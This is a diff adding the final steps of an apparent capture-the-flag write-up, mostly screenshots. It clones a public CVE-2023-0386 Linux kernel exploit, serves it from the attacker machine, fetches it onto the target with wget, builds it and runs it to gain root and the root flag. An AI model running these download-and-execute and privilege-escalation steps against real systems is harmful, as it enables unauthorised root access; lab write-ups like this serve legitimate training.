@@ -226,6 +226,68 @@ su admin
 <img width="962" height="116" alt="image" src="https://github.com/user-attachments/assets/5dde9b41-31d0-4b22-93c8-05706aa7a139" />
 
 
+**We look for the user's flag in their directory**
+
+<img width="913" height="179" alt="image" src="https://github.com/user-attachments/assets/da045b47-efef-453a-af3a-afb1c44881f7" />
+
+
+**While searching through directories, we found an interesting email.**
+
+<img width="964" height="396" alt="image" src="https://github.com/user-attachments/assets/a9a0865e-6c62-4a07-8b73-a7e0b5607a46" />
+
+
+**We proceed to download the exploit to our machine and then listen to it using wget**
+```bash
+ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
+ zip -r exploit.zip CVE-2023-0386
+ python -m http.server 80
+```
+
+<img width="989" height="136" alt="image" src="https://github.com/user-attachments/assets/36d9fbb8-cb6f-43e6-a0d0-79d43c60c65b" />
+
+
+**Now in the lab we're going to transfer our team's files to each other**
+```bash
+wget http://10.10.15.98/exploit.zip
+unzip exploit.zip
+cd CVE-2023-0386
+```
+
+<img width="961" height="534" alt="image" src="https://github.com/user-attachments/assets/5b586e8e-d29a-41f2-9912-c7a12f565eec" />
+
+
+**Now we make a `makeall`**
+```bash
+makeall
+```
+
+<img width="962" height="545" alt="image" src="https://github.com/user-attachments/assets/ae9a33cc-69ec-4773-8fe5-f4432e8f7780" />
+
+
+**We will escalate root privileges with the exploit**
+
+```bash
+./fuse ./ovlcap/lower ./gc &
+./exp
+```
+<img width="961" height="543" alt="image" src="https://github.com/user-attachments/assets/7bfb540e-b67a-4a4a-a8f6-db0eec35f247" />
+
+
+
+**Let's see what's in the root directory**
+<img width="961" height="543" alt="image" src="https://github.com/user-attachments/assets/1032a758-a942-4df4-8745-13ef6eb5694e" />
+
+
+**Finally, we captured the root flag.**
+
+<img width="963" height="393" alt="image" src="https://github.com/user-attachments/assets/91f5a9ec-1636-4523-b0cd-89cf2457de42" />
+
+
+
+<img width="627" height="534" alt="image" src="https://github.com/user-attachments/assets/7e95a4c6-107f-436f-aa1b-ff0cca3d424c" />
+
+
+
 
 
 
